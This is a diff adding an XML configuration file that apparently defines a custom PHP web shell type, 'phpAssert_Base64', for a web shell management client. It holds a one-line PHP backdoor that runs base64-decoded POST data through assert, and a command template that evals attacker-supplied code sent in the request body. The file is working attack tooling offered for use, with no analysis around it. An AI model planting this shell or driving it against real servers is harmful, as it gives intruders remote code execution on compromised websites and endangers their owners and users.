@@ -1,0 +1,12 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<customShellType>
+  <basicSetting>
+    <name>phpAssert_Base64</name>
+    <serviceExample><![CDATA[<?php @assert(base64_decode($_POST[a]))?>]]></serviceExample>
+	<mainCodeParam location="Body" encrymode="Base64" >passwd</mainCodeParam>
+  </basicSetting>
+  <mainCodeSetting>
+	<funcCodeParam location="Body" encrymode="Base64" >funcCode</funcCodeParam>
+	<item><![CDATA[@eval("print('->|');".base64_decode($_POST[$funcCode$])."print('|<-');");]]></item>
+  </mainCodeSetting>
+</customShellType>
